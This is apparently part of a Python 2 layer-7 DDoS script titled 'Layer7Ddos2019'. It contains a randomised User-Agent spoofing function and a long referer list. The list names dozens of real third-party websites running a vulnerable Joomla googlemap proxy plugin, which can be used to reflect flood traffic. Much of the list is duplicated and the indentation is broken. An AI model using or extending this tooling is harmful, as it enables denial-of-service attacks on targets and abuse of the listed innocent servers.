# -*- coding: utf-8 -*-
#!/usr/bin/env python2
#Coded By P3terJ4mes:
#Forbidden to Edit,Mod:
#####################################
#####################################
####0h00/1/1/2019--Layer7Ddos2019####
####Check_ProxyHost_By_P3terJ4mes####
#####################################
#####################################
import os
import sys
import time
import urllib
import random
import httplib
import urllib2
import datetime
import requests
import threading
from threading import Lock
from threading import Thread

Close = False
Lock = threading.Lock()
request_counter = 0
Request_counter = 0
headers_referers= []

def getUserAgent():
    #Get platform:
    platform = random.choice(['Macintosh', 'Windows', 'X11', 'Android','Windows Phone','BlackBerry OS','Symbian'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC','Intel Mac OS X 10.8.2 Mountain Lion','Intel Mac OS X 10.9 Marvericks','Intel Mac OS X 10.10 Yosemite','Intel Mac OS X 10.11 El Capitan','Intel Mac OS 10.12 Sierra'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8','Windows 10'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64', 'Linux i386', ' Linux Core i7-4980HQ','Linux i586','Linux armv7l'])
    elif platform == 'Android':
        os  = random.choice(['Android 1.5 ', 'Android 1.6', 'Android 2.0','Android 2.1','Android 2.2','Android 2.2.3','Android 2.3','Android 2.3.7','Android 3.0','Android 3.2.6','Android 4.0','Android 4.0.4','Android 4.1','Android 4.3.1','Android 4.4','Android 4.4.4','Android 5.0','Android 5.1.1','Android 6.0','Android 6.0.1','Android 7.0','Android 7.1.2','Android 8.0','Android 8.1','Android 9.0'])
    elif platform == 'Windows Phone':
        os  = random.choice(['Windows Phone 8.0', 'Windows Phone 8.1', 'Windows Phone 10.0', 'Windows Phone OS 7.5'])
    elif platform == 'Symbian':
        os  = random.choice(['Nokia200', 'Nokia201', 'NokiaC3-00','Nokia3250','Nokia7650','Nokia3650','NokiaN-Gage','NokiaSX1','Nokia6600','NokiaN93','NokiaE61i','NokiaN93i','Nokia9300i','Nokia7700','Nokia Arima ASP805','Nokia Motorola A920','Nokia Sony Ericsson P990','Nokia 6110 Navigator','Nokia Samsung SGH-D700','Nokia Siemens SX1','Nokia Sendo X & X2','Nokia N-Gage & N-Gage QD','Nokia 6120/6121 Classic'])
    elif platform == 'BlackBerry OS':
        os  = random.choice(['BlackBerry 9780', 'BlackBerry 9300', 'BlackBerry 9700','BlackBerry 9900','BlackBerry 9320','BlackBerry 9360','BlackBerry 9810','BlackBerry 9930','BlackBerry 9790','BlackBerry 9860','BlackBerry 9650','BlackBerry 9981','BlackBerry 9720'])
    #Get browser:    
    browser = random.choice(['chrome', 'firefox', 'ie','opera','opera mini','androi browser','uc','safari','outlook'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    
    elif browser == 'firefox':
         currentYear = datetime.date.today().year
         year = str(random.randint(2000, currentYear))
         month = random.randint(1, 12)
         if  month < 10:
             month = '0' + str(month)
         else:
             month = str(month)
         day = random.randint(1, 31)
         if  day < 10:
             day = '0' + str(day)
         else:
             day = str(day)
         gecko = year + month + day
         version = str(random.randint(1, 21)) + '.0'
         return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
        
    elif browser == 'ie':
         version = str(random.randint(1, 10)) + '.0'
         engine = str(random.randint(1, 6)) + '.0'
         option = random.choice([True, False])
         if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
         else:
            token = ''
         return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

    elif browser == 'opera':
         engine = str(random.randint(10, 400)) + '.0'
         version = str(random.randint(1, 20)) + '.0'
         option = random.choice([True, False])
         if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
         else:
            token = ''
         return 'Opera/9.80 (' + os + ';' + token  + 'Presto/2.' + engine + 'Version/12.' + version + ')'
        
    elif browser == 'opera mini':
         engine = str(random.randint(10, 400)) + '.0'
         version = str(random.randint(1, 20)) + '.0'
         option = random.choice([True, False])
         return 'Opera/9.80 (J2ME/MIDP; Opera Mini/' + '5.1.21051/28.3392; U; en)' + 'Presto/2.' + engine + 'Version/12.' + version + ')'
        
    elif browser == 'androi browser':
         webkit = str(random.randint(500, 599))
         version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
         return 'Mozilla/5.0 (' + os + ';de-de; GT-I8190 Build/JZO54K) AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Version/' + version + ' Mobile Safari/' + webkit

    elif browser == 'uc':
         webkit = str(random.randint(500, 599))
         version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
         return 'Mozilla/5.0 (' + os + 'zh-CN; F5121 Build/34.0.A.1.247) AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Version/' + version + ' Chrome/40.0.2214.89 UCBrowser/11.5.1.944 Mobile Safari/' + webkit

    elif browser == 'safari':
         webkit = str(random.randint(500, 599))
         version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
         return 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X)' + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Version/' + version + ' Mobile Safari/' + webkit

    elif browser == 'outlook':
         version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(7000,9000))
         return 'Microsoft Office/14.0 (' + os + 'Microsoft Outlook' + version + '; Pro)'

     

def referer_list():
    try :
        global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
	headers_referers.append('http://vk.com/profile.php?redirect=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
	headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
	headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
	headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
	headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
	headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
	headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
	headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
	headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
	headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
	headers_referers.append('http://help.baidu.com/searchResult?keywords=')
	#bing
	headers_referers.append('http://www.bing.com/search?q=')
	headers_referers.append('https://www.yandex.com/yandsearch?text=')
	headers_referers.append('https://duckduckgo.com/?q=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.aol.com/aol/search?q=')
	headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
	headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://host-tracker.com/check_page/?furl=')
	headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
	headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
	headers_referers.append('https://add.my.yahoo.com/rss?url=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
         headers_referers.append('http://streamitwebseries.twww.tv/proxy.php?url=')
        headers_referers.append('http://www.comicgeekspeak.com/proxy.php?url=')
        headers_referers.append('http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://thevintagechurch.com/www2/index.php?url=/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt')
        headers_referers.append('http://web-sniffer.net/?url=')
        headers_referers.append('http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=')
        headers_referers.append('http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=')
        headers_referers.append('http://translate.yandex.net/tr-url/ru-uk.uk/')
        headers_referers.append('http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=')
        headers_referers.append('http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=')
        headers_referers.append('http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=')
